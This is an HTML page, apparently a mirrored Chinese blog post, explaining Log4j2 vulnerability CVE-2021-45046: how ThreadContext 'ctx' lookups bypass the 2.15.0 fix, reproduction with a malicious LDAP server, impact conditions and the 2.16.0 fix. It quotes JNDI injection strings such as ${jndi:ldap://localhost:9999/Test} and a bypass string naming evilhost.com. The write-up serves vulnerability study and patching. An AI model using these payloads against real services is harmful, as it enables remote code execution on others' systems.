@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Log4j2中2.15.0版漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理) - IT学习者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Log4j2中2.15.0版漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理)" />
+<meta property="og:description" content="系列文章 2.15.0之前版漏洞相关文章
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理
+2.15.0版漏洞相关文章
+Log4j2中2.15.0版存在的漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理)
+2.16.0版漏洞相关文章
+Log4j2中2.16.0版中DOS攻击（CVE-2021-45105）的漏洞原理、复现步骤和修复方法(2.17.0修复原理)
+一、前言 当Log4j2发布2.15.0版修复了Log4j2基于Ldap的注入漏洞之后。2.15.0的版本很快就被爆出了新的注入漏洞。但是这次漏洞爆出之后，大家却不怎么着急升级，到底是为什么呢？这就需要从该漏洞的原理以及影响说起了。
+接下来我们就一起来探索下该漏洞的原理、复现步骤、影响范围，以及官方在2.16.0版本中是如何修复的。
+学习该漏洞之前，请先学习理解Log4j2在2.15.0的漏洞的原理。否则你可能很难理解该文中部分内容。具体如下：
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)
+Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理
+二、漏洞原理 1、漏洞简介 通过Log4j2官方介绍Log4j – Apache Log4j 2，我们对该漏洞能有如下初步的认识。
+该漏洞是因为使用者在日志中打印出了ctx（线程上线文信息）相关的信息。而该信息如果来自用户输入，则会给攻击者可乘之机。其同样可以发起ldap注入攻击，实现执行远程代码或者本地类。
+2、具体原理 在介绍给漏洞之前，我们先简单回顾下2.15.0之前版本的漏洞的基本原理和解决步骤 ，根据之前分析，可知原来的漏洞流程大致如下：
+1、攻击者发送消息(包含ldap远程执行指令)
+2、log4j2打印该日志
+3、log4j2解析其中的ldap，于是执行lookup操作
+4、触发java的ldap的lookup功能，最终远程指令或者本地存在风险的类被执行。
+为了解决该漏洞，官方做了如下两个修改（具体参考下图）：
+1、在MessagePatternConverter中默认关闭了lookup功能
+2、在JndiManager中新增了域名、协议和解析类的白名单
+3、在JndiManager中禁止了远程javaFactory的加载。
+由上图可以看到，2.15.0改版之后，攻击者要完整的执行远程代码加载攻击链（图中红色链路），则基本不可能了。因为消息处理中lookup默认被关闭了。同时提供了白名单，给让用户在开启Lookup的时候，能够控制允许哪些域名、协议和类支持调用底层lookup。
+那么在2.15.0的版本下，怎样可以绕过这个lookup开关限制呢？
+在Log4j2中，我们在配置日志格式的时候，通过需要配置变量来打印日志时间、打印线程ID等。
+如上图，其中的ctx前缀表示从线程上下文获取参数api版本信息。当我们在代码执行的时候，将该变量set到ThreadContext中后，该变量就会打印到日志中。
+这个功能看似很正常，但是却存在一个问题。即：它支持对其配置内容进行lookup，且其和消息的Lookup完全是两个分支。在继续介绍之前，我们需要简单了解下，Log4j2对日志规则中的变量的处理逻辑。
+其对所有的变量都有不同的PatternConverter类来处理解析，从而获取到不同的字符串内容。其对应的子类非常多，部分如下：
+我们之前所的2.15.0之前的漏洞就是因为处理消息（配置%m， %msg）的处理类MessagePatternConverter默认开启了lookup功能。
+而我们这里介绍的ctx则使用的LiteralPatternConverter处理类，其也开启了lookup功能。
+其lookup的功能的实现如下：
+1、首先在日志规则中做如下配置。表示日志中需要打印线程上下文中的变量apiVersion对应的值。
+2、在代码请求的位置设置apiVersion=${jndi:ldap://localhost:9999/Test}
+3、当打印日志的时候，log4j2会解析日志规则。并使用 LiteralPatternConverter类解析${ctx:apiVersion}，将其解析成${jndi:ldap://localhost:9999/Test}
+4、解析完成后，发现其还存在${}占位符，于是继续对齐进行解析。判断为ldap
+5、于是调用JndiManager执行底层ldap的lookup逻辑。从而触发恶意代码执行。
+那么这个功能怎样才会被攻击者利用尼？
+因为有些时候，可能log4j2的使用者，会将用户的某个入参传递到ContextMap中，供日志打印出来。将入参直接设置到apiVersion中（为了默认直接设置，实际通常是从header中获取）。
+如果是这样的场景，则攻击者即可以想利用2.15.0之前的漏洞一样，传入恶意的ldap串，进行攻击。
+其整个攻击原理图如下：
+可以看到其和2.15.0版本中的消息处理逻辑很相似。唯一不同的是：
+1、该LiteralPatternConverter中默认就允许执行lookup操作。
+2、LiteralPatternConverter解析后得到的字符串用于替换${ctx:xxx}所占的位置，最终随日志一起打印。
+三、复现步骤 1、基本介绍 接下来，我们来尝试一起复现。其实通过上面的攻击原理图，大家应该比较清楚。我们要构造请求很容，但是因为2.15.0在JndiManager中新增了域名、协议和加载类的白名单。我们还是很难让其调用外部的ldap服务。
+但实际上是可以通过构造DNS的方式，让其调用外部服务，从而实现攻击。其官方说法是其已经在MacOS上复现了。参考：Log4j Vulnerability CVE-2021-45046 Now a Critical 9." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itnewbiea.github.io/posts/48310ce816194a50a7e56a401aff7307/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-20T21:21:11+08:00" />
+<meta property="article:modified_time" content="2021-12-20T21:21:11+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">IT学习者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Log4j2中2.15.0版漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理)</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <h2>系列文章</h2> 
+<p> </p> 
+<p><strong>2.15.0之前版漏洞相关文章</strong></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121920264" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939902" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939754" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939839" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理</a></p> 
+<p></p> 
+<p><strong>2.15.0版漏洞相关文章</strong></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/122046180" title="Log4j2中2.15.0版存在的漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理)">Log4j2中2.15.0版存在的漏洞（CVE-2021-45046）的注入原理、复现步骤和如何修复(2.16.0修复原理)</a></p> 
+<p><strong>2.16.0版漏洞相关文章</strong></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/122046202" title="Log4j2中2.16.0版中DOS攻击（CVE-2021-45105）的漏洞原理、复现步骤和修复方法(2.17.0修复原理)">Log4j2中2.16.0版中DOS攻击（CVE-2021-45105）的漏洞原理、复现步骤和修复方法(2.17.0修复原理)</a></p> 
+<p></p> 
+<h2>一、前言</h2> 
+<p>当Log4j2发布2.15.0版修复了Log4j2基于Ldap的注入漏洞之后。2.15.0的版本很快就被爆出了新的注入漏洞。但是这次漏洞爆出之后，大家却不怎么着急升级，到底是为什么呢？这就需要从该漏洞的原理以及影响说起了。</p> 
+<p>接下来我们就一起来探索下该漏洞的原理、复现步骤、影响范围，以及官方在2.16.0版本中是如何修复的。</p> 
+<p>学习该漏洞之前，请先学习理解Log4j2在2.15.0的漏洞的原理。否则你可能很难理解该文中部分内容。具体如下：</p> 
+<p> <a href="https://blog.csdn.net/hilaryfrank/article/details/121920264" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(一)—开篇与基础知识</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939902" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939754" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)</a></p> 
+<p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939839" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(四)—漏洞修复原理</a></p> 
+<h2>二、漏洞原理</h2> 
+<h3>1、漏洞简介</h3> 
+<p>通过Log4j2官方介绍<a href="https://logging.apache.org/log4j/2.x/" rel="nofollow" title="Log4j – Apache Log4j 2">Log4j – Apache Log4j 2</a>，我们对该漏洞能有如下初步的认识。</p> 
+<p>该漏洞是因为使用者在日志中打印出了ctx（线程上线文信息）相关的信息。而该信息如果来自用户输入，则会给攻击者可乘之机。其同样可以发起ldap注入攻击，实现执行远程代码或者本地类。</p> 
+<p><img alt="" height="1022" src="https://images2.imgbox.com/2b/47/SdLqdwzs_o.png" width="1200"></p> 
+<h3>2、具体原理</h3> 
+<p>在介绍给漏洞之前，我们先简单回顾下2.15.0之前版本的漏洞的基本原理和解决步骤 ，根据之前分析，可知原来的漏洞流程大致如下：</p> 
+<p>1、攻击者发送消息(包含ldap远程执行指令)</p> 
+<p>2、log4j2打印该日志</p> 
+<p>3、log4j2解析其中的ldap，于是执行lookup操作</p> 
+<p>4、触发java的ldap的lookup功能，最终远程指令或者本地存在风险的类被执行。</p> 
+<p>为了解决该漏洞，官方做了如下两个修改（具体参考下图）：</p> 
+<p>1、在MessagePatternConverter中默认关闭了lookup功能</p> 
+<p>2、在JndiManager中新增了域名、协议和解析类的白名单</p> 
+<p>3、在JndiManager中禁止了远程javaFactory的加载。</p> 
+<p><img alt="" height="1200" src="https://images2.imgbox.com/4d/8d/kIydj6FO_o.png" width="1200"></p> 
+<p>由上图可以看到，2.15.0改版之后，攻击者要完整的执行远程代码加载攻击链（图中红色链路），则基本不可能了。因为消息处理中lookup默认被关闭了。同时提供了白名单，给让用户在开启Lookup的时候，能够控制允许哪些域名、协议和类支持调用底层lookup。</p> 
+<p>那么在2.15.0的版本下，怎样可以绕过这个lookup开关限制呢？</p> 
+<p>在Log4j2中，我们在配置日志格式的时候，通过需要配置变量来打印日志时间、打印线程ID等。</p> 
+<p><img alt="" height="140" src="https://images2.imgbox.com/c9/21/RDLcLH37_o.png" width="1200">如上图，其中的ctx前缀表示从线程上下文获取参数api版本信息。当我们在代码执行的时候，将该变量set到ThreadContext中后，该变量就会打印到日志中。</p> 
+<p><img alt="" height="353" src="https://images2.imgbox.com/de/37/51CVKAWe_o.png" width="759"></p> 
+<p><img alt="" height="102" src="https://images2.imgbox.com/91/f0/VpZ4X1l2_o.png" width="1200"></p> 
+<p>这个功能看似很正常，但是却存在一个问题。即：它支持对其配置内容进行lookup，且其和消息的Lookup完全是两个分支。在继续介绍之前，我们需要简单了解下，Log4j2对日志规则中的变量的处理逻辑。</p> 
+<p>其对所有的变量都有不同的PatternConverter类来处理解析，从而获取到不同的字符串内容。其对应的子类非常多，部分如下：</p> 
+<p><img alt="" height="918" src="https://images2.imgbox.com/53/56/ZmexgPYy_o.png" width="1064"></p> 
+<p>我们之前所的2.15.0之前的漏洞就是因为处理消息（配置%m， %msg）的处理类MessagePatternConverter默认开启了lookup功能。</p> 
+<p>而我们这里介绍的ctx则使用的LiteralPatternConverter处理类，其也开启了lookup功能。</p> 
+<p><img alt="" height="358" src="https://images2.imgbox.com/3e/7c/lBUCJFW3_o.png" width="1200"></p> 
+<p>其lookup的功能的实现如下：</p> 
+<p>1、首先在日志规则中做如下配置。表示日志中需要打印线程上下文中的变量apiVersion对应的值。</p> 
+<p><img alt="" height="88" src="https://images2.imgbox.com/3f/d6/fWUEnM0K_o.png" width="1200"></p> 
+<p>2、在代码请求的位置设置apiVersion=${jndi:ldap://localhost:9999/Test}</p> 
+<p><img alt="" height="188" src="https://images2.imgbox.com/cc/c1/EXRAgSfn_o.png" width="1200">3、当打印日志的时候，log4j2会解析日志规则。并使用 LiteralPatternConverter类解析${ctx:apiVersion}，将其解析成${jndi:ldap://localhost:9999/Test}</p> 
+<p>4、解析完成后，发现其还存在${}占位符，于是继续对齐进行解析。判断为ldap</p> 
+<p>5、于是调用JndiManager执行底层ldap的lookup逻辑。从而触发恶意代码执行。</p> 
+<p>那么这个功能怎样才会被攻击者利用尼？</p> 
+<p>因为有些时候，可能log4j2的使用者，会将用户的某个入参传递到ContextMap中，供日志打印出来。将入参直接设置到apiVersion中（为了默认直接设置，实际通常是从header中获取）。</p> 
+<p><img alt="" height="726" src="https://images2.imgbox.com/01/95/sNxtXJ80_o.png" width="1200"></p> 
+<p>如果是这样的场景，则攻击者即可以想利用2.15.0之前的漏洞一样，传入恶意的ldap串，进行攻击。</p> 
+<p>其整个攻击原理图如下：</p> 
+<p><img alt="" height="1200" src="https://images2.imgbox.com/24/9b/Lr6lpCiD_o.png" width="1200"></p> 
+<p>可以看到其和2.15.0版本中的消息处理逻辑很相似。唯一不同的是：</p> 
+<p>1、该LiteralPatternConverter中默认就允许执行lookup操作。</p> 
+<p>2、LiteralPatternConverter解析后得到的字符串用于替换${ctx:xxx}所占的位置，最终随日志一起打印。</p> 
+<h2>三、复现步骤</h2> 
+<h3>1、基本介绍</h3> 
+<p>接下来，我们来尝试一起复现。其实通过上面的攻击原理图，大家应该比较清楚。我们要构造请求很容，但是因为2.15.0在JndiManager中新增了域名、协议和加载类的白名单。我们还是很难让其调用外部的ldap服务。</p> 
+<p>但实际上是可以通过构造DNS的方式，让其调用外部服务，从而实现攻击。其官方说法是其已经在MacOS上复现了。参考：<a href="https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-45046/#CVE-2021-45046_Explained" rel="nofollow" title="Log4j Vulnerability CVE-2021-45046 Now a Critical 9.0 | WhiteSource">Log4j Vulnerability CVE-2021-45046 Now a Critical 9.0 | WhiteSource</a></p> 
+<p><img alt="" height="880" src="https://images2.imgbox.com/98/21/kPMMeZFF_o.png" width="1200"> <img alt="" height="514" src="https://images2.imgbox.com/2a/f8/N9FCWx3o_o.png" width="1200"></p> 
+<p>由于楼主在网上并没有找到如何通过这种DNS Provider的方式绕过本地域名白名单校验。于是我们这里的复现步骤，都基于本地ldap服务实现。</p> 
+<h3>2、复现步骤</h3> 
+<p>首先我们需要搭建ldap恶意服务、和codebase恶意服务器。具体请参考：<a href="https://blog.csdn.net/hilaryfrank/article/details/121939754" title="Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)_Life of Coder-CSDN博客">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(三)—复现步骤(攻击方法)_Life of Coder-CSDN博客</a></p> 
+<p>ldap恶意服务器的搭建和之前有所不同。不知道大家在看上述原理的时候有么有注意到，我们提到了这个漏洞的执行会触发两次ldap服务器的请求（下图绿色部分）。其中第一次完全是为了校验（由Log4j2主动请求），第二次才是真正的处理（由java底层的ldap类进行请求）。</p> 
+<p><img alt="" height="1200" src="https://images2.imgbox.com/9c/5e/HOxGQwit_o.png" width="1200"></p> 
+<p>且我们有提到在2.15.0版本中其关闭了远程javaFactory的处理。如果返回了factory，则log4j2直接不执行后续的lookup操作（java底层的lookup功能）。</p> 
+<p><img alt="" height="646" src="https://images2.imgbox.com/ea/59/ApEurNKq_o.png" width="1200"></p> 
+<p>于是为了绕过这个逻辑，我们需要在修改下ldap服务器的返回数据。第一次校验的时候，只返回codebase地址，不返回factory相关数据。第二次请求的时候返回完整的ldap数据。这样就能完美绕过该功能。</p> 
+<p><img alt="" height="1200" src="https://images2.imgbox.com/0a/b5/CG3QGP9U_o.png" width="1200"> 然后我们只需要在日志中做如下配置：</p> 
+<p><img alt="" height="88" src="https://images2.imgbox.com/e2/0b/AOSP3RyX_o.png" width="1200"></p> 
+<p>并编写存在漏洞的接口，如下：</p> 
+<p><img alt="" height="726" src="https://images2.imgbox.com/80/68/8ZUPatYw_o.png" width="1200"></p> 
+<p>然后调用该接口即可。</p> 
+<p><img alt="" height="578" src="https://images2.imgbox.com/74/8b/J5bVoMTi_o.png" width="1200"></p> 
+<p>完成之后，mac电脑上的文件管理器会自动弹出来。至此攻击完成。</p> 
+<p><img alt="" height="872" src="https://images2.imgbox.com/26/19/K9fJpRkF_o.png" width="1200"></p> 
+<h2>四、影响范围</h2> 
+<p>通过理解该漏洞原理和复现步骤之后，咱们也就能够分析出其在什么场景下才会造成影响。该漏洞能够在2.15.0版本下复现必须满足如下所有前提</p> 
+<p>1、业务使用了ctx在日志规则中打印线程上下文中对应key，如：apiVersion</p> 
+<p>2、ctx中对应的key(如apiVersion)必须来自外部输入，且未做安全校验</p> 
+<p>3、同时需要业务的DSN被污染，能够将//127.0.0.1#evilhost.com:1389/a解析到evilhost.com域名下去(具体未找到官方提到的方法)。</p> 
+<p>由于该漏洞的场景要求比较特殊，在2.15.0版本上基本都不会怎么复现。所以业界也基本没有怎么兴起升级2.15.0版本的浪潮。</p> 
+<h2>五、官方修复原理(2.16.0版)</h2> 
+<p>1、默认关闭了Jndi</p> 
+<p>在2.16.0中，官方默认关闭了jndi。且不推荐大家开启该功能。</p> 
+<p><img alt="" height="974" src="https://images2.imgbox.com/55/c7/DQcPZp2F_o.png" width="1200"></p> 
+<p>在JndiManager中新增了jndi开关，通过log4j2.enableJndi参数来控制。默认为false。</p> 
+<p><img alt="" height="150" src="https://images2.imgbox.com/ab/6c/J93KbwzS_o.png"></p> 
+<p>同时在新建JndiManager管理类时会判断，如果开关关闭，则创建空的JndiManager类，即空的JndiManager无法执行任何JNDI操作。</p> 
+<p><img alt="" height="400" src="https://images2.imgbox.com/86/32/B39lze7q_o.png"></p> 
+<p>空JndiManager执行lookup方法时会直接返回null。不会执行真正的lookup逻辑。</p> 
+<h4><img alt="" height="400" src="https://images2.imgbox.com/8e/0b/HL4lYCu2_o.png"></h4> 
+<p>同时官方在Interpolator中在关闭了jndi的情况下，也不会注入JndiLookup的处理类。从而在关闭了jndi的场景下，再也不会处理jndi的lookup操作。</p> 
+<p><img alt="" height="1104" src="https://images2.imgbox.com/16/0f/WYWdVGGM_o.png" width="1200"></p> 
+<h3>2、彻底删除了消息中的Lookup功能</h3> 
+<p>应该是考虑到消息中执行Lookup功能，可能会存在潜在未知的安全风险，于是官方直接在MessagePatternConverter将消息的lookup功能移除了。2.15.0中可以通过配置lookup配置开启该功能。</p> 
+<p><img alt="" height="370" src="https://images2.imgbox.com/62/20/IyVJohM9_o.png" width="1200"> 源码：MessagePatternConverter</p> 
+<p><img alt="" height="487" src="https://images2.imgbox.com/da/db/AcYO8aFX_o.png" width="1200"></p> 
+<blockquote> 
+ <p>PS：该修改点和本文讨论的漏洞没有关系，其只是2.16.0版本中一起修改的一个点而已。</p> 
+</blockquote> 
+<h2>六、惯例</h2> 
+<p>如果你喜欢本文或觉得本文对你有所帮助，欢迎<strong>一键三连</strong>支持，非常感谢。</p> 
+<p>如果你对本文有任何疑问或者高见，欢迎添加公众号<strong>lifeofcoder</strong>共同交流探讨（添加公众号可以获得楼主最新博文推送以及”Java高级架构“上10G视频和图文资料哦）。</p> 
+<p style="text-align:center;"><img alt="" height="295" src="https://images2.imgbox.com/e1/21/s5T5OddZ_o.jpg" width="284"></p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/08700d341062d87f823755e2aac5ab46/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">css 使用:checked实现自定义单选框、复选框、开关、标签复选、素材单选等实用实战案例</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/8a831746c9125a315617cb99eafdc9f1/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">面试题：请写出一个jdbc</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 IT学习者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://itnewbiea.github.io/js/foot.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
